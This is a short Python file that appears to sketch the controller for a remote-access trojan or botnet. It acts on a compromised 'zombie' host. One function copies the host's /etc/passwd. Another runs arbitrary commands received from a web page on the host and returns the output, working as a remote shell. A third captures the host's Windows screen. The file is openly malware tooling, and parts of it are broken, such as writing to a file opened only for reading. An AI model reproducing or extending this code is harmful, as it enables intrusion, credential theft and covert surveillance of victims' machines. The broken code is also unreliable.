def backup(zombie):

    # remote_3 = await zombie.setvar("name1", 3)
    # remote_5 = await zombie.setvar("name2", 5)
    # await zombie.eval(remote_3 * remote_5)

    with zombie.open('/etc/passwd') as remote:
        with open('/tmp/passwd') as local:
            for line in remote:
                local.write(line)

def shell(webapp, zombie):
    webapp.output('''html''')
    while True:
        # cmd = input('$>')
        cmd = webapp.input()
        remote_process = zombie.os.subprocess.Popen(cmd)
        for line in remote_process.readline():
            webapp.output(line)


def screenshot(zombie):
    if zombie.platform.platform() == 'windows':
        return zombie.win32.capture_screen()
    else:
        raise NotImplementedError()


